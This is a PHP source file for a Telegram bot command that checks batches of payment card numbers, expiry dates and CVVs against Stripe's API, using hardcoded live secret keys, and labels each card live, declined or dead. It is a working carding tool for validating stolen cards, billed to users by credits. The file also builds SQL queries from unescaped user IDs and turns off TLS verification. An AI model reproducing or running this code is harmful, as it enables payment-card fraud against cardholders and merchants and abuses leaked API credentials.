<?php
if(strpos($message, "/mchk")===0 or strpos($message, "!mchk")===0 or strpos($message, ".mchk")===0){
// reply_to($chatId,$message_id,$keyboard,$maintain);
// exit();
$message = substr($message,6);

if (empty($message)){
reply_to($chatId,$message_id,$keyboard,$validauth);
exit();
}

$link = mysqli_connect("localhost", "root", "", "demo");
$sql = "SELECT role FROM persons WHERE userid='$gId'";
$result20 = mysqli_query($link, $sql);
$json_array = [];
while ($row = mysqli_fetch_assoc($result20)) {
  $json_array[] = $row;
}
$final201 = json_encode($json_array);
$role = trim(strip_tags(GetStr($final201, '"role":"','"')));
mysqli_close($link);
if($role == 'USER'){
reply_to($chatId,$message_id,$keyboard,$nopre);
exit();
}elseif(empty($role)){
reply_to($chatId,$message_id,$keyboard,$noregister);
 exit();
}
      
$link = mysqli_connect("localhost", "root", "", "demo");
$sql = "SELECT credits FROM persons WHERE userid='$gId'";
$result = mysqli_query($link, $sql);

$json_array = [];


while ($row = mysqli_fetch_assoc($result)) {
  $json_array[] = $row;
}

$final2 = json_encode($json_array);

$client = trim(strip_tags(GetStr($final2, '"credits":"','"')));
mysqli_close($link);

if($client < 5)
{
 reply_to($chatId, $message_id,$keyboard,$nocredits);
 exit();
}elseif(empty($client)){
 reply_to($chatId, $message_id,$keyboard,$noregister);
 exit();
}
$link = mysqli_connect("localhost", "root", "", "demo");
      $sql = "SELECT time FROM persons WHERE userid='$gId'";
$result20 = mysqli_query($link, $sql);
$json_array = [];
while ($row = mysqli_fetch_assoc($result20)) {
  $json_array[] = $row;
}
$final20 = json_encode($json_array);
$times = trim(strip_tags(GetStr($final20, '"time":"','"')));
mysqli_close($link);

$link = mysqli_connect("localhost", "root", "", "demo");

$sql = "SELECT role FROM persons WHERE userid='$gId'";
$result20 = mysqli_query($link, $sql);
$json_array = [];
while ($row = mysqli_fetch_assoc($result20)) {
  $json_array[] = $row;
}
$final201 = json_encode($json_array);
$role = trim(strip_tags(GetStr($final201, '"role":"','"')));
mysqli_close($link);
$current = time();
$sec = $current - $times;
if($role == 'MEMBER' and $sec < 60)
{
 $after = 60 - $sec;
  $antispam = urlencode ("<b>[ANTISPAM] <u> TRY AGAIN AFTER $after sec.</u></b>");
reply_to($chatId,$message_id,$keyboard,$antispam);
 exit();
}
    $sendmes = "https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=Checking...&reply_to_message_id=".$message_id."&parse_mode=HTML";
    $sent = json_decode(file_get_contents($sendmes) ,1);
    global $mes_id;
    $mes_id = $sent['result']['message_id'];
    sleep(1);
    $aray = gibarray($message);
    $cout = count($aray);
    $total = $cout * 5;
    if (count($aray) > 10){
    editMessage($chatId,'Limit Exceeded %0AOnly 10 Card At One Time', $mes_id);
    exit();
    }
    else{
      global $fullmes;
      $fullmes = '';
	  echo '<pre>'; print_r($aray); echo '</pre>';

      foreach ($aray as $cc){
		echo "Checking : $cc <br>";
        $result = chemker1($cc);
		echo "Result For $cc : $result<hr>";
      }
    }
           
$link = mysqli_connect("localhost", "root", "", "demo");
$sql = "SELECT credits FROM persons WHERE userid='$gId'";
$result = mysqli_query($link, $sql);

$json_array = [];


while ($row = mysqli_fetch_assoc($result)) {
  $json_array[] = $row;
}

$final2 = json_encode($json_array);

$client = trim(strip_tags(GetStr($final2, '"credits":"','"')));
mysqli_close($link);
$balance = $client - $total;
mysqli_close($link);
$link = mysqli_connect("localhost", "root", "", "demo");
$sql = "UPDATE persons SET credits = '$balance' WHERE persons.userid='$gId'";
$result = mysqli_query($link, $sql);
     $timest = time();
$link = mysqli_connect("localhost", "root", "", "demo");
$sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
$result21 = mysqli_query($link, $sql);
mysqli_close($link);
}

function chemker1($lista){

  ///-----------------------CC PARSE -----------------------///
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
//--SK GENERATE----------------------///
$skArray = array(
    // 'sk_live_69GKI0saLB8uIEnxzv8VTvRX',
    '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',
    'sk_live_Yg3BCYRPuomB9AZVtsaQh3nF', //euro
    // 'sk_live_',
);
  if (isset($skArray)) { 
   $sk = $skArray[array_rand($skArray)]; 
  } else {
     echo 'YOU SUCK BRO';
  }
  echo $sec.'<hr>';
  ///////////////////////////////////===[phpsession]////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');
$t = curl_exec($ch);
$tok1 = GetStr($t,'"id": "','"');
$msg = GetStr($t,'"message": "','"');
echo "<pre> <hr> $t <hr> <pre>";
//sendMessage1($t);
if(strpos($t, "incorrect_number")){
$ccresult = "INCORRECT NUMBER❌";
$charge = "Invalid number";
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=5000&currency=inr&payment_method_types[]=card');
$p = curl_exec($ch);
$tok2 = GetStr($p,'"id": "','"');
echo "<pre> <hr> $p<hr> <pre>";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$tok2.'/confirm');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method='.$tok1.'');
 $response = curl_exec($ch);
 $result2 = curl_exec($ch);
$ns = GetStr($response,'"network_status": "','"');
$rl = GetStr($response,'"risk_level": "','"');
$char = preg_replace('/_/', ' ', ucfirst(GetStr($response,'"decline_code": "','"')));
$sm = GetStr($response,'"seller_message": "','"');
$cvccheck = GetStr($response,'"cvc_check": "','"');
curl_close($ch);
if(strpos($result2, '"cvc_check": "pass"')) {
    $ccresult = 'CVV LIVE✅';
    $charge = 'CVC PASS';
  }elseif(strpos($result2, '"success":true' )) {
    $ccresult = 'CVV LIVE✅ ';
    $charge = 'CHARGES 5$';
  }elseif(strpos($result2, 'insufficient funds' )) {
     $ccresult = 'CVV LIVE✅';
     $charge = 'insufficient funds';
  }elseif (strpos($result2, "security code is incorrect")) {
    $ccresult = 'CCN LIVE✅';
$charge = "CVV INCORRECT";
  } elseif (strpos($result2, "expired")) {
    $ccresult = 'EXIRED CARD❌';
  }elseif(strpos($result2, 'incorrect zip' )) {
    $ccresult = 'ZIP INCORRECT ✅';
  }elseif(strpos($result2, 'testmode_charges_only' )) {
    $ccresult = 'TEST MODE❌';
    $charge = 'SK DEAD';
  }elseif(strpos($result2, "Invalid API Key" )) {
    $ccresult = 'INVALID SK❌';
    $charge = 'SK DEAD';
  }elseif(strpos($result2, "Sending credit card numbers directly to the Stripe API is generally unsafe" )) {
    $ccresult = 'TEST SK❌';
    $charge = 'DEAD SK';
  }elseif(strpos($result2, "api_key_expired" )) {
    $ccresult = 'API EXPIRED❌';
    $charge = 'DEAD SK';
  }elseif(strpos($result2, "card_declined" )) {
    $ccresult = 'DECLINED❌';
  }elseif(empty($result2)){
    $ccresult = 'Unkown Error❌';
  }
  if(!empty($char)){
  $charge = $char;
  }
  if(empty($cvccheck)){
  $cvccheck = 'null';
  }
  if(empty($rl)){
  $rl = 'null';
  }
  global $mes_id, $chatId , $fullmes;
  $fullmes = $fullmes.$lista.'%0A'.$ccresult.'-'.$charge.'%0A'.$cvccheck.'-Level-'.$rl.'|@RoldexVerseBot%0A';
  editMessage($chatId,$fullmes,$mes_id);
  echo $fullmes.'<br>';
  return $ccresult;
}
?>











